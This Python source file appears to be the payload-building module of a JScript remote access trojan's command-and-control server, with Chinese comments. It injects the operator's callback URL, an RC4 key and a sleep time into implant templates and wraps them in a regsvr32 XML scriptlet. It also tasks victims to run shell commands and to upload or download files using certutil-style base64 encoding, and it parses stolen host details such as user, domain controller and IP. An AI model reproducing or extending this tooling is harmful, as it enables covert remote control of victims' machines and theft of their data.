#!/usr/bin/env python3
# coding:utf-8
from base64 import b64decode, b64encode
from .color import BOLD


def load_template_js(template_name):
    with open(template_name) as f:
        return f.read()


def decode_certutil_base64(data):
    alldata = data.splitlines()
    if "-----BEGIN CERTIFICATE-----" in alldata[0] and "-----END CERTIFICATE-----" in alldata[-1]:
        return b64decode("".join(alldata[1:-1]))
    else:
        return ''


def encode_certutil_base64(data):
    bcode = b64encode(data)
    alldata = [bcode[i:i+64].decode() for i in range(0, len(bcode), 64)]

    return '{}{}{}'.format('-----BEGIN CERTIFICATE-----|', '|'.join(alldata), '|-----END CERTIFICATE-----')


class Payload():
    def __init__(self):
        pass

    @classmethod
    def init(cls, server_addr):
        context = load_template_js('template/init.js')
        context = context.replace(
            '~URL_RAT~', 'http://{}:{}/rat'.format(server_addr[0], server_addr[1]))

        return context.encode()

    @classmethod
    def rat(cls, server_addr, rc4_key, sleep_time):
        context = load_template_js('template/rat.js')
        context = context.replace(
            '~URL_RUN~', 'http://{}:{}'.format(server_addr[0], server_addr[1]))
        context = context.replace('~KEY~', rc4_key)
        context = context.replace('~SLEEP~', str(sleep_time))

        return context.encode()

    @classmethod
    def regsvr(cls, server_addr):
        init_js = cls.init(server_addr).decode()
        context = load_template_js('template/regsvr.xml')
        context = context.replace('~JS_RAT~', init_js)

        return context.encode()
    '''
    文件上传
    读取文件并编码为certutil的base64格式，上传到临时文件后，由certutil解码写入
    '''

    def __js_upload(self, kwargs):
        try:
            with open(kwargs['local_pathname'], 'rb') as f:
                data = encode_certutil_base64(bytes(f.read()))
        except Exception as e:
            print('upload Exception:{}'.format(str(e)))
            return ''
        self.context = self.context.replace(
            '~PATH_FILE~', kwargs['remote_pathname'].replace('\\', '\\\\'))
        self.context = self.context.replace('~UPLOAD_DATA~', data)

    '''
    获取任务执行的payload
    '''

    def get_payload(self, payload_type, job_id, kwargs):
        # 读取模板文件，替换JOBID
        self.context = load_template_js('template/{}.js'.format(payload_type))
        self.context = self.context.replace('~JOB_ID~', str(job_id))
        # 不同的payload的替换和处理
        if payload_type == 'upload':
            self.__js_upload(kwargs)
        elif payload_type == 'download':
            self.context = self.context.replace(
                '~PATH_FILE~', kwargs['remote_pathname']).replace('\\', '\\\\')
        elif payload_type == 'cat':
            self.context = self.context.replace(
                '~FILE_PATHNAME~', kwargs['file_pathname'])
        elif payload_type == 'run' or payload_type == 'shell':
            self.context = self.context.replace('~CMD~', kwargs['cmd'])
        elif payload_type == 'sleep':
            self.context = self.context.replace('~SLEEP~', kwargs['sleep'])

        return self.context.encode()
    '''
    获取基本信息任务执行返回时的处理
    '''

    def __job_info(self, response_text):
        if len(response_text) <= 0:
            return None
        info_array = response_text.split('///')
        if len(info_array) == 7:
            def p(x, y): return print('{}:{}'.format(BOLD(x),  info_array[y]))
            p('USER', 0)
            p('HOST', 1)
            p('OS', 2)
            p('DC', 3)
            p('ARCH', 4)
            p('CWD', 5)
            p('IP', 6)

            return info_array
        else:
            print(response_text)
            return None
    '''
    下载任务的返回数据处理：base64解码后写入到文件中
    '''

    def __job_download(self, response_text, args):

        if 'fail' not in response_text:
            data = decode_certutil_base64(response_text)
            try:
                with open(args['local_pathname'], 'wb') as f:
                    f.write(data)
                print('[download finish]')
                return '[download finish]'
            except Exception as ex:
                raise
                print('download Exception:{}'.format(str(ex)))
                return 'download Exception:{}'.format(str(ex))
        else:
            print(response_text)
            return response_text

    '''
    对任务返回数据进行处理
    '''

    def payload_callback(self, response_text, job_type, args):
        if job_type == 'info':
            return self.__job_info(response_text)
        elif job_type == 'download':
            return self.__job_download(response_text, args)
        else:
            print(response_text)

            return response_text
